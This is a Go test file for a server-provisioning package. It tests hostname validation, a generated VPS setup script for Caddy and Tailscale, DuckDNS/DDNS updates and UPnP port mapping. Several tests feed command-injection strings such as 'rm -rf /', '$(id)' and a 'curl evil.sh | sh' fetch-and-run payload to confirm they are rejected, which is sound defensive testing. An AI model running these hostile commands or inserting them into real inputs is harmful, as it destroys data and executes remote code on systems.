package provision

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"strings"
	"testing"
)

func TestNormalizeHostRejectsAnythingThatIsNotAHostname(t *testing.T) {
	// These end up in a Caddyfile and in a script pasted into a root shell.
	for _, bad := range []string{
		"", "nodots", "a b.example.com", "x.example.com; rm -rf /",
		"x.example.com\nevil.com {", "$(id).example.com", "x.example.com/path",
		"-x.example.com", "x..example.com", "'x.example.com",
	} {
		if got, err := NormalizeHost(bad); err == nil {
			t.Errorf("NormalizeHost(%q) accepted it as %q", bad, got)
		}
	}
	for in, want := range map[string]string{
		"RDGW.Example.com":   "rdgw.example.com",
		" rdgw.example.com.": "rdgw.example.com",
		"a-b.c1.example.org": "a-b.c1.example.org",
	} {
		if got, err := NormalizeHost(in); err != nil || got != want {
			t.Errorf("NormalizeHost(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
}

func TestVPSScriptRefusesHostileValues(t *testing.T) {
	c := relayConfig(t)
	c.PublicDomain = "x.example.com'; curl evil.sh | sh; '"
	if _, err := VPSScript(c); err == nil {
		t.Fatal("a hostile hostname reached the generated script")
	}
	c = relayConfig(t)
	c.ACMEEmail = "a@b.com\nimport evil"
	if _, err := VPSScript(c); err == nil {
		t.Fatal("a hostile email reached the generated script")
	}
	c = relayConfig(t)
	c.TailscaleIP = "100.1.1.1; reboot"
	if _, err := VPSScript(c); err == nil {
		t.Fatal("a hostile address reached the generated script")
	}
}

func TestVPSScriptContainsWhatTheServerNeeds(t *testing.T) {
	c := relayConfig(t)
	c.ACMEEmail = "max@example.com"
	out, err := VPSScript(c)
	if err != nil {
		t.Fatalf("VPSScript: %v", err)
	}
	for _, want := range []string{
		"#!/usr/bin/env bash",
		"set -euo pipefail",
		"DOMAIN='rdgw.example.com'",
		"UPSTREAM='100.101.102.103:8081'",
		"reverse_proxy 100.101.102.103:8081",
		"email max@example.com",
		"flush_interval -1",
		"iptables",       // Oracle images reject 80/443 by default
		"caddy validate", // never reload a broken config
		"tailscale up",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("script missing %q", want)
		}
	}
	// The Caddyfile travels inside a quoted heredoc, so nothing in it can be
	// expanded by the shell.
	if !strings.Contains(out, "<<'CADDYEOF'") {
		t.Error("Caddyfile must be embedded in a quoted heredoc")
	}
}

func TestDuckDNSURL(t *testing.T) {
	u, err := DuckDNSURL("MyHome.duckdns.org", " abc-123 ")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"domains=myhome", "token=abc-123", "ip="} {
		if !strings.Contains(u, want) {
			t.Errorf("%q missing %q", u, want)
		}
	}
	for _, bad := range []string{"", "a.b", "x/y", "x&token=1"} {
		if _, err := DuckDNSURL(bad, "t"); err == nil {
			t.Errorf("accepted name %q", bad)
		}
	}
	if _, err := DuckDNSURL("ok", ""); err == nil {
		t.Error("accepted an empty token")
	}
}

// Providers say "no" with a 200. Reporting success for a wrong token would
// surface hours later as a networking mystery.
func TestUpdateDDNSTreatsBodyRefusalsAsFailure(t *testing.T) {
	for body, wantErr := range map[string]bool{
		"OK": false, "good 1.2.3.4": false, "nochg 1.2.3.4": false,
		"KO": true, "badauth": true, "nohost": true, "abuse": true,
	} {
		body := body
		srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			_, _ = io.WriteString(w, body)
		}))
		defer srv.Close()
		_, err := UpdateDDNSWith(context.Background(), srv.Client(), srv.URL+"/update?token=secret-token")
		if (err != nil) != wantErr {
			t.Errorf("body %q: err = %v, wantErr %v", body, err, wantErr)
		}
	}
}

func TestUpdateDDNSErrorsNeverContainTheToken(t *testing.T) {
	_, err := UpdateDDNS(context.Background(), "https://127.0.0.1:1/update?token=super-secret-value")
	if err == nil {
		t.Skip("unexpectedly reachable")
	}
	if strings.Contains(err.Error(), "super-secret-value") {
		t.Errorf("token leaked into error text: %v", err)
	}
}

func TestUpdateDDNSRequiresHTTPS(t *testing.T) {
	if _, err := UpdateDDNS(context.Background(), "http://example.com/update"); err == nil {
		t.Error("a plain-http update URL (token in the clear) was accepted")
	}
}

func TestIsPublicIPv4(t *testing.T) {
	for ip, want := range map[string]bool{
		"84.108.1.2": true, "8.8.8.8": true,
		"10.1.2.3": false, "192.168.1.1": false, "172.20.0.1": false,
		"100.64.0.1": false, "100.127.255.254": false, // CGNAT block
		"100.128.0.1": true, "169.254.1.1": false, "::1": false, "junk": false,
	} {
		if got := IsPublicIPv4(ip); got != want {
			t.Errorf("IsPublicIPv4(%q) = %v, want %v", ip, got, want)
		}
	}
}

// A fake router: serves a device description and records the SOAP calls.
func fakeRouter(t *testing.T, calls *[]string) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("/desc.xml", func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.WriteString(w, `<?xml version="1.0"?><root xmlns="urn:schemas-upnp-org:device-1-0">
<device><deviceList><device><deviceList><device><serviceList>
<service><serviceType>urn:schemas-upnp-org:service:WANIPConnection:1</serviceType>
<controlURL>/ctl</controlURL></service></serviceList></device></deviceList></device></deviceList></device></root>`)
	})
	mux.HandleFunc("/ctl", func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		*calls = append(*calls, r.Header.Get("SOAPAction")+"|"+string(b))
		if strings.Contains(r.Header.Get("SOAPAction"), "GetExternalIPAddress") {
			_, _ = io.WriteString(w, `<s:Envelope><s:Body><u:R><NewExternalIPAddress>84.1.2.3</NewExternalIPAddress></u:R></s:Body></s:Envelope>`)
			return
		}
		_, _ = io.WriteString(w, `<ok/>`)
	})
	return httptest.NewServer(mux)
}

func TestUPnPFindsNestedServiceAndMapsThePort(t *testing.T) {
	var calls []string
	srv := fakeRouter(t, &calls)
	defer srv.Close()

	igd, err := igdFromLocation(context.Background(), srv.URL+"/desc.xml")
	if err != nil {
		t.Fatalf("igdFromLocation: %v", err)
	}
	if !strings.HasSuffix(igd.ControlURL, "/ctl") {
		t.Errorf("ControlURL = %q", igd.ControlURL)
	}
	ip, err := igd.ExternalIP(context.Background())
	if err != nil || ip != "84.1.2.3" {
		t.Errorf("ExternalIP = %q, %v", ip, err)
	}
	if err := igd.AddMapping(context.Background(), 443, 443, "RD <Gateway>", 900); err != nil {
		t.Fatalf("AddMapping: %v", err)
	}
	last := calls[len(calls)-1]
	for _, want := range []string{
		"AddPortMapping",
		"<NewExternalPort>443</NewExternalPort>",
		"<NewProtocol>TCP</NewProtocol>",
		"<NewLeaseDuration>900</NewLeaseDuration>",
		"RD &lt;Gateway&gt;", // description is escaped
	} {
		if !strings.Contains(last, want) {
			t.Errorf("SOAP call missing %q\n%s", want, last)
		}
	}
}

// A router description that points its control URL at another host would turn
// this into a request forwarder.
func TestUPnPRefusesControlURLOffDevice(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.WriteString(w, `<root><URLBase>http://203.0.113.9/</URLBase><device><serviceList>
<service><serviceType>urn:schemas-upnp-org:service:WANIPConnection:1</serviceType>
<controlURL>/ctl</controlURL></service></serviceList></device></root>`)
	}))
	defer srv.Close()
	if _, err := igdFromLocation(context.Background(), srv.URL+"/d.xml"); err == nil {
		t.Fatal("accepted a control URL on a different host")
	}
}

// A syntax error in the script is only discovered by someone pasting it into a
// server, so it is checked here with the shell itself.
func TestVPSScriptIsValidBash(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	c := relayConfig(t)
	c.ACMEEmail = "max@example.com"
	out, err := VPSScript(c)
	if err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command(bash, "-n")
	cmd.Stdin = strings.NewReader(out)
	if b, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("bash -n rejected the script: %v\n%s", err, b)
	}
}
